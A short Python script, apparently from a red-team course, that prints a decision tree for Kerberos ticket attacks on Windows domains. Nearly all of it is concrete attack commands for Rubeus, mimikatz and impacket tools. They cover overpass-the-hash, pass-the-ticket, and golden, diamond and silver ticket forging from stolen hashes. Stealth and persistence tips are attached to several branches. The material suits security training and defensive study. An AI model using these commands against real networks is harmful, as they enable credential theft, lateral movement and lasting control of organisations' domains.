"""
Ticket Attack Decision Tree — Operator flowchart for selecting
the correct ticket attack based on available material.

Maps: material in hand → attack type → platform-specific commands.
"""


def print_ticket_decision_tree():
    """Print the full ticket attack decision tree."""
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║                  TICKET ATTACK DECISION TREE                        ║
╚══════════════════════════════════════════════════════════════════════╝

  Q: What material do you have?
  ═══════════════════════════════

  [NTLM HASH — no Kerberos ticket yet]
  │
  ├── Want to use Kerberos (not NTLM)?
  │   └── OVERPASS-THE-HASH
  │       ├── Linux:  getTGT.py domain/user -hashes :HASH -dc-ip DC
  │       │           export KRB5CCNAME=user.ccache
  │       ├── Win:    Rubeus.exe asktgt /user:USER /rc4:HASH /ptt
  │       └── Win:    mimikatz sekurlsa::pth /user:USER /ntlm:HASH /run:cmd
  │
  └── Fine with NTLM auth?
      └── Standard Pass-the-Hash (Day 18)

  [AES256 KEY]
  │
  └── OVERPASS-THE-HASH (stealthiest)
      ├── Linux:  getTGT.py domain/user -aesKey KEY -dc-ip DC
      └── Win:    Rubeus.exe asktgt /user:USER /aes256:KEY /ptt /opsec

  [KERBEROS TICKET (.kirbi or .ccache)]
  │
  └── PASS-THE-TICKET
      ├── Linux:  export KRB5CCNAME=ticket.ccache
      │           wmiexec.py domain/user@target -k -no-pass
      ├── Win:    Rubeus.exe ptt /ticket:ticket.kirbi
      └── Win:    mimikatz kerberos::ptt ticket.kirbi

  [KRBTGT HASH (from DCSync)]
  │
  ├── Need maximum access/persistence?
  │   └── GOLDEN TICKET
  │       ├── Linux:  ticketer.py -nthash KRBTGT_HASH -domain-sid SID
  │       │                       -domain DOMAIN Administrator
  │       ├── Win:    mimikatz kerberos::golden /user:Admin /domain:DOMAIN
  │       │                    /sid:SID /krbtgt:HASH /ptt
  │       └── Win:    Rubeus.exe golden /user:Admin /domain:DOMAIN
  │                              /sid:SID /rc4:HASH /ptt
  │
  └── Need stealthier alternative?
      └── DIAMOND TICKET (requires KRBTGT AES256 + valid creds)
          └── Win:    Rubeus.exe diamond /krbkey:AES256 /user:lowpriv
                                         /password:pass /ptt

  [SERVICE ACCOUNT HASH]
  │
  └── SILVER TICKET (no DC contact!)
      ├── Linux:  ticketer.py -nthash SVC_HASH -domain-sid SID
      │                       -domain DOMAIN -spn SPN user
      ├── Win:    mimikatz kerberos::golden /user:Admin /domain:DOMAIN
      │                    /sid:SID /rc4:SVC_HASH /target:HOST
      │                    /service:CIFS /ptt
      └── Win:    Rubeus.exe silver /user:Admin /service:SPN
                                    /rc4:SVC_HASH /ptt
""")